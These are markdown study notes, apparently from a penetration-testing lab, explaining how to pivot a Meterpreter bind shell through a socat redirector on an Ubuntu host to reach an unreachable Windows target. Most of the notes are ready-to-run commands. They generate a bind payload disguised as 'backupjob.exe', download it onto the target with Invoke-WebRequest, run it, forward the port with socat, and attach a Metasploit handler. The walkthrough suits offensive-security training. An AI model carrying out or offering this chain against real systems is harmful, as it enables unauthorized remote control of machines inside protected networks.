
# 🔹 SOCAT BIND SHELL REDIRECTION 


### Reverse Shell vs Bind Shell

|Type|Who connects?|
|---|---|
|Reverse shell|Target → Attacker|
|Bind shell|Attacker → Target|

---

## 🔸 In THIS scenario

- Windows target → runs **bind shell (listens)**
    
- Ubuntu (pivot) → acts as **redirector using socat**
    
- Attack host → **connects to Ubuntu**, not Windows directly
    

---

## 🔹 Flow (understand this clearly)

```
Attack Host → Ubuntu (8080) → Windows (8443)
```

Step-by-step flow:

1. Windows starts **listener (bind shell)** on port 8443
    
2. Ubuntu listens on 8080 using socat
    
3. Ubuntu forwards traffic → Windows:8443
    
4. Attacker connects → Ubuntu:8080
    
5. Socat redirects → Windows bind shell
    
6. Meterpreter session established
    

---

# 🔹 STEPWISE EXECUTION (WHO RUNS WHAT)

---

## ✅ STEP 1 — Create Bind Payload

📍 Run on **Attack Host**

```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

### 🔹 Why:

- Creates payload that:
    
    - runs on Windows
        
    - **opens port 8443**
        
    - waits for incoming connection
        

---

## ✅ STEP 2 — Transfer payload to Windows

📍 From Attack Host → via Ubuntu

Example:

```bash
scp backupjob.exe ubuntu@<ubuntu-ip>:~/
```

Then serve via HTTP:

```bash
python3 -m http.server 8123
```

📍 On Windows:

```powershell
Invoke-WebRequest http://172.16.5.129:8123/backupjob.exe -OutFile C:\backupjob.exe
```

---

## ✅ STEP 3 — Run payload on Windows

📍 On **Windows target**

```powershell
C:\backupjob.exe
```

### 🔹 Result:

- Windows starts listening on:
    

```
172.16.5.19:8443
```

---

## ✅ STEP 4 — Start SOCAT Redirector

📍 Run on **Ubuntu (pivot host)**

```bash
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```

---

### 🔹 What this does:

- Ubuntu listens on **port 8080**
    
- Forwards everything → Windows:8443
    

---

### 🔹 Why needed?

Because:

- Attack host **cannot reach 172.16.5.19 directly**
    
- But it **CAN reach Ubuntu**
    

So Ubuntu becomes a **bridge**

---

## ✅ STEP 5 — Start Metasploit Bind Handler

📍 Run on **Attack Host (msfconsole)**

```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST <ubuntu-ip>
set LPORT 8080
run
```

---

### 🔹 Important:

- `RHOST = Ubuntu IP` (NOT Windows)
    
- Because we connect to Ubuntu → socat → Windows
    

---

## 🔹 FINAL FLOW (VERY CLEAR)

```
[Attack Host]
   ↓ connect
Ubuntu:8080 (socat)
   ↓ forward
Windows:8443 (bind shell)
   ↓
Meterpreter session
```

---

# 🔹 KEY DIFFERENCE (SOCAT vs SSH)

|Feature|SSH Tunneling|SOCAT|
|---|---|---|
|Requires SSH login|Yes|No|
|Encryption|Yes|No|
|Flexibility|Medium|High|
|Usage|Common|Advanced pivoting|

---

# 🔹 QUICK MEMORY TRICK

- **Bind shell = target listens**
    
- **Socat = forwarder**
    
- **Attacker connects to pivot, not target**
    

---

# 🔹 COMMON CONFUSION (IMPORTANT)

### ❓ Why RHOST = Ubuntu?

Because:

- You are NOT connecting directly to Windows
    
- You connect → Ubuntu (8080)
    
- Ubuntu forwards → Windows (8443)
